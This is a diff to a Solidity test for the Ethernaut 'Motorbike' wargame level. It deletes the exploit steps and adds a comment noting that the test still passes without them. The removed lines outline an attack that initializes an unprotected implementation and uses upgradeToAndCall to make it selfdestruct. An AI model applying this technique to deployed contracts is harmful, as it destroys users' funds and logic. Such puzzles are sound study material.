@@ -14,6 +14,8 @@ contract MotorbikeTest is DSTest {
         // Deal EOA address some ether
         vm.deal(eoaAddress, 5 ether);
     }
+    
+    // This level passes despite the level attack being deleted...
 
     function testMotorbikeHack() public {
         /////////////////
@@ -27,20 +29,6 @@ contract MotorbikeTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
-
-        // initialise the engine
-        engine.initialize();
-
-        // Set up bike Exy 
-        BikeExy bikeExy = new BikeExy();
-
-        // Get data required for the upgrade to and call method
-        bytes memory initEncoded = abi.encodeWithSignature("initialize()");
-
-
-        // upgrade to and call will delegate call to bikeExy which will run selfdestruct
-        engine.upgradeToAndCall(address(bikeExy), initEncoded);
-        
 
         //////////////////////
         // LEVEL SUBMISSION //
